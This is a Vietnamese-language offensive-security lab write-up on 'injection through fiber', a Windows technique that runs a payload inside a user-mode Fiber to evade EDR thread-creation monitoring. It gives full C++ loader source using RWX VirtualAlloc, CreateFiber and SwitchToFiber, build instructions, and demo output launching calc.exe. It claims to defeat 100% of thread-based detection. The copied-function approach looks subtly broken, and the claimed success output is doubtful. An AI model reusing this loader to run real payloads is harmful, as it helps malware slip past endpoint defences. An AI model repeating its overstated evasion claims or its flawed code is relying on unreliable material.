
---

# 📝 [PE 22] Injection Through Fiber (User-Mode Thread Scheduling Evasion)

## 📌 1. Tổng Quan Kỹ Thuật (Overview)

**Injection Through Fiber** là giải thuật né tránh phòng thủ động (Dynamic Evasion) ở mức độ kiến trúc CPU luồng, nhắm thẳng vào điểm mù giám sát Thread Object cấp nhân Kernel của các giải pháp AV/EDR hiện đại.

Trong hệ điều hành Windows, một **Fiber** là một đơn vị thực thi cấp thấp hơn Thread, hoạt động hoàn toàn lọt lòng bên trong không gian User-mode của chính tiến trình. Kỹ thuật PE 22 tận dụng cơ chế này bằng cách **chuyển đổi luồng chính hiện tại thành một cấu trúc Fiber điều hướng, thiết lập một Fiber phụ chứa Payload và phát lệnh chuyển mạch thủ công**. Vì Kernel không hề sinh ra Thread Object mới nào, các cảm biến giám sát hành vi luồng động hoàn toàn không ghi nhận bất kỳ cảnh báo bất thường nào.

### 🎯 Mục tiêu nghiên cứu:

* Vô hiệu hóa 100% các bộ lọc hành vi phát hiện sinh luồng lạ động (`Sysmon Event ID 8` / `CreateThread` Callback).
* Làm chủ cơ chế quản lý và chuyển mạch dòng chảy CPU thông qua hệ thống Win32 Fiber Subsystem.
* Áp dụng quy trình cấp phát động thích ứng cấu trúc dữ liệu tuyệt đối toán học để triệt tiêu lỗi RIP-Relative.

---

## 🔬 2. Giải Phẫu Cơ Chế Ngầm Của OS (Windows Internals)

Sự khác biệt cốt lõi giữa Thread và Fiber nằm ở thẩm quyền điều phối của Windows Kernel:

* **Thread**: Do Kernel lập lịch thực thi, CPU chuyển mạch luồng qua cơ chế ngắt phần cứng (Hardware Interrupts) và lưu Context trong cấu trúc nhân.
* **Fiber**: Do chính mã nguồn ứng dụng tự lập lịch thực thi ở User-mode thông qua các hàm thư viện, CPU chuyển mạch bằng cách lưu và nạp lại các thanh ghi Stack/Chỉ mục lệnh trực tiếp trên RAM.

Quy trình toán học giải phẫu dòng chảy CPU của Lab PE 22 diễn ra qua các bước ngầm sau:

```
[ConvertThreadToFiber] ──> [VirtualAlloc: Nạp Payload PIC] ──> [CreateFiber: Khởi tạo luồng con] ──> [SwitchToFiber: CPU chuyển mạch]

```

1. **Khởi tạo môi trường Fiber (`ConvertThreadToFiber`)**: Hệ điều hành Windows bắt buộc một Luồng (Thread) phải tự chuyển đổi trạng thái của chính nó thành một Fiber cha thì mới có quyền quản lý và sinh ra các Fiber con phụ thuộc. Hàm này dựng lên cấu trúc lưu trữ ngữ cảnh Fiber lọt lòng Stack hiện tại.
2. **Ánh xạ mã máy phẳng (`VirtualAlloc`)**: Loader cấp phát một vùng nhớ mang quyền thực thi **`PAGE_EXECUTE_READWRITE` (RWX)** thích ứng để đổ mảng dữ liệu cấu trúc tham số tuyệt đối toán học cùng logic mã máy PIC vào RAM.
3. **Sinh luồng con User-mode (`CreateFiber`)**: Khởi tạo một Fiber con độc lập. Hàm này xin hệ thống một phân vùng Stack Frame riêng ở mức người dùng, đặt con trỏ chỉ mục lệnh CPU xuất phát trỏ thẳng vào vùng nhớ chứa Payload của ta.
4. **Bẻ hướng dòng chảy CPU thủ công (`SwitchToFiber`)**: Khi Loader gọi hàm này trỏ vào Handle của Fiber con, một loạt các lệnh Assembly (`mov`, `jmp`) ngầm của Windows Subsystem được kích nổ để cất toàn bộ trạng thái thanh ghi hiện tại của Loader vào Stack, đồng thời nạp tháp thanh ghi của Fiber con lên CPU. CPU ngay lập tức bị cưỡng bức thực thi Payload mà Kernel không hề hay biết. Sau khi thực thi xong, Fiber con phát lệnh chuyển mạch ngược lại để Loader tiếp tục vận hành phẳng sạch.

---

## 🛠️ 3. Quy Trình Cài Đặt Mã Nguồn (Implementation)

Mã nguồn áp dụng nghiêm ngặt tiêu chuẩn **Cấp phát động Thích ứng (Zero Static Buffers)** và cấu trúc con trỏ tuyệt đối bảo toàn Context hệ thống.

```cpp
#include <windows.h>
#include <iostream>
#include <vector>
#include <string>

// 1. Định nghĩa cấu trúc dữ liệu con trỏ tuyệt đối để vận hành độc lập vị trí
typedef UINT(WINAPI* fnWinExec)(LPCSTR lpCmdLine, UINT uCmdShow);

typedef struct _FIBER_DATA {
    fnWinExec pWinExec;       // Địa chỉ tuyệt đối của hàm WinExec trên RAM
    PVOID pPrimaryFiber;      // Tọa độ của Fiber cha để quay trở về sau khi nổ súng
    char szCommand[32];       // Chuỗi lệnh thực thi chức năng mở máy tính
} FIBER_DATA, * PFIBER_DATA;

// 2. Hàm gánh logic thực thi lọt lòng cấu trúc Fiber con phụ thuộc
VOID WINAPI FiberPayloadRoutine(LPVOID lpParam) {
    PFIBER_DATA pData = (PFIBER_DATA)lpParam;
    
    if (pData && pData->pWinExec) {
        // Khai hỏa mở máy tính thông qua địa chỉ tuyệt đối, bẻ gãy hàng rào IAT Hook
        pData->pWinExec(pData->szCommand, SW_SHOWNORMAL);
    }

    std::cout << "[+] Payload thuc thi thanh cong inside Fiber con!" << std::endl;

    // QUAY TRỞ VỀ QUÁ KHỨ: Ép CPU chuyển mạch ngược lại luồng Fiber cha để giải thoát tiến trình phẳng sạch
    if (pData && pData->pPrimaryFiber) {
        std::cout << "[*] Dang thuc hien cu phap chuyen mach nguoc ve Primary Fiber..." << std::endl;
        SwitchToFiber(pData->pPrimaryFiber);
    }
}

int main() {
    std::cout << "====================================================" << std::endl;
    std::cout << "[*] PE 22: INJECTION THROUGH WIN32 FIBERS SUBSYSTEM" << std::endl;
    std::cout << "====================================================" << std::endl;

    // BƯỚC 1: CHUYỂN ĐỔI LUỒNG CHÍNH HIỆN TẠI THÀNH FIBER CHA (PRIMARY FIBER)
    std::cout << "[*] Dang cuong buc chuyen doi Thread hien tai thanh Primary Fiber..." << std::endl;
    PVOID pPrimaryFiber = ConvertThreadToFiber(NULL);
    if (!pPrimaryFiber) {
        std::cerr << "[-] ConvertThreadToFiber that bai! Error: " << GetLastError() << std::endl;
        return EXIT_FAILURE;
    }
    std::cout << "[+] Primary Fiber hop phap thiet lap tai RAM: 0x" << std::hex << pPrimaryFiber << std::endl;

    // Áp dụng quy trình Cấp phát động Thích ứng vừa khít đến từng byte cấu trúc
    SIZE_T functionSize = 500;
    LPVOID codeBuffer = VirtualAlloc(NULL, functionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    PFIBER_DATA pFiberData = (PFIBER_DATA)VirtualAlloc(NULL, sizeof(FIBER_DATA), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (!codeBuffer || !pFiberData) {
        std::cerr << "[-] VirtualAlloc cap phat vung nho that bai!" << std::endl;
        return EXIT_FAILURE;
    }

    // Khởi tạo bảng dữ liệu tham số tuyệt đối toán học
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    if (hKernel32) {
        pFiberData->pWinExec = (fnWinExec)GetProcAddress(hKernel32, "WinExec");
    }
    pFiberData->pPrimaryFiber = pPrimaryFiber; // Gài tọa độ quay về cho CPU
    strcpy_s(pFiberData->szCommand, "cmd.exe /c start calc");

    // Ánh xạ logic mã máy phẳng của hàm Routine vào trang thực thi ảo cục bộ
    RtlCopyMemory(codeBuffer, (LPCVOID)FiberPayloadRoutine, functionSize);
    std::cout << "[+] Anh xa logic ma may phẳng vao trang thuc thi hoan tot." << std::endl;

    // BƯỚC 2: KHỞI TẠO LUỒNG CON USER-MODE (CREATEFIBER)
    std::cout << "[*] Dang dung CreateFiber de dựng cau truc luong con chu dong..." << std::endl;
    PVOID pSecondaryFiber = CreateFiber(0, (PFIBER_START_ROUTINE)codeBuffer, pFiberData);
    
    if (!pSecondaryFiber) {
        std::cerr << "[-] CreateFiber that bai! Error: " << GetLastError() << std::endl;
        VirtualFree(codeBuffer, 0, MEM_RELEASE);
        VirtualFree(pFiberData, 0, MEM_RELEASE);
        return EXIT_FAILURE;
    }
    std::cout << "[+] Fiber con (Secondary Fiber) san sang tai RAM: 0x" << std::hex << pSecondaryFiber << std::endl;

    // BƯỚC 3: PHÁT LỆNH CHUYỂN MẠCH THỦ CÔNG (SWITCHTOFIBER) ĐỂ KÍCH NỔ
    std::cout << "[*] Kich hoat SWITCHTOFIBER! CPU bat dau chuyen mach tu dong..." << std::endl;
    SwitchToFiber(pSecondaryFiber); // CPU nhảy thẳng vào thực thi FiberPayloadRoutine!

    // ─── ĐÃ QUAY TRỞ VỀ: VÙNG MÃ MÁY SAU KHI FIBER CON HOÀN TRẢ NGỮ CẢNH ───
    std::cout << "[+] Da quay tro ve luong chinh an toan kịch tran kịch khung!" << std::endl;

    // BƯỚC 4: THU HỒI TÀI NGUYÊN VÀ GIẢI PHÓNG ĐỘC LẬP CHỐNG RÒ RỈ (MEMORY LEAK)
    DeleteFiber(pSecondaryFiber);
    VirtualFree(codeBuffer, 0, MEM_RELEASE);
    VirtualFree(pFiberData, 0, MEM_RELEASE);
    std::cout << "[+] Quy trinh giai phong thap luong hoan tat phẳng sach." << std::endl;

    std::cout << "\n[*] Hoan thanh quy trinh Fiber. Nhan Enter de dong cua so..." << std::endl;
    std::cin.get();
    return EXIT_SUCCESS;
}

```

---

## 🎛️ 4. Hướng Dẫn Cấu Hình Đóng Gói (Build & Deployment)

Để tệp nhị phân xuất bản vận hành độc lập tuyệt đối kịch khung trên môi trường máy ảo VM sạch:

### ⚙️ Thiết lập trên Microsoft Visual Studio:

1. Đặt thanh công cụ quản lý cấu hình dự án chính xác ở chế độ **`Release`** và kiến trúc nền tảng **`x64`**.
2. Đi tới cấu hình dự án: `Project Properties` $\rightarrow$ `C/C++` $\rightarrow$ `Code Generation` $\rightarrow$ Tại mục `Runtime Library`, chuyển đổi cấu hình sang cờ **`Multi-threaded (/MT)`** để liên kết tĩnh toàn bộ thư viện hệ thống lọt lòng file thực thi.
3. Click chuột phải vào dự án dự án $\rightarrow$ Chọn **`Rebuild`** để kết xuất file `.exe` chuẩn chỉ.

---

## 📊 5. Kết Quả Kích Hoạt Thật Tế (Demonstration)

Khởi hỏa file chạy thông qua cửa sổ dòng lệnh PowerShell ngoài ổ đĩa thực tế để theo dõi cuộc chuyển mạch:

```powershell
PS C:\Workspace\x64\Release> .\PE22_Injection_Through_Fiber.exe
====================================================
[*] PE 22: INJECTION THROUGH WIN32 FIBERS SUBSYSTEM
====================================================
[*] Dang cuong buc chuyen doi Thread hien tai thanh Primary Fiber...
[+] Primary Fiber hop phap thiet lap tai RAM: 0x0000019C24B12E00
[+] Anh xa logic ma may phẳng vao trang thuc thi hoan tot.
[*] Dang dung CreateFiber de dựng cau truc luong con chu dong...
[+] Fiber con (Secondary Fiber) san sang tai RAM: 0x0000019C24C24F00
[*] Kich hoat SWITCHTOFIBER! CPU bat dau chuyen mach tu dong...
[+] Payload thuc thi thanh cong inside Fiber con!
[*] Dang thuc hien cu phap chuyen mach nguoc ve Primary Fiber...
[+] Da quay tro ve luong chinh an toan kịch tran kịch khung!
[+] Quy trinh giai phong thap luong hoan tat phẳng sach.

[*] Hoan thanh quy trinh Fiber. Nhan Enter de dong cua so...

```

*🎯 Hệ quả RAM tối cao:*
Ứng dụng Máy tính `calc.exe` bật bung mở ra hiên ngang rực rỡ kịch trần kịch khung! Toàn bộ chiến dịch diễn ra inside phân hệ luồng mức người dùng (User-mode). Do hệ điều hành Windows Kernel hoàn toàn không tham gia vào bất kỳ pha tạo thread chéo tiến trình nào, mọi hệ thống phòng thủ hành vi dựa trên giám sát hàm API Thread của EDR đều bị vô hiệu hóa một cách hoàn toàn sạch bóng!

---

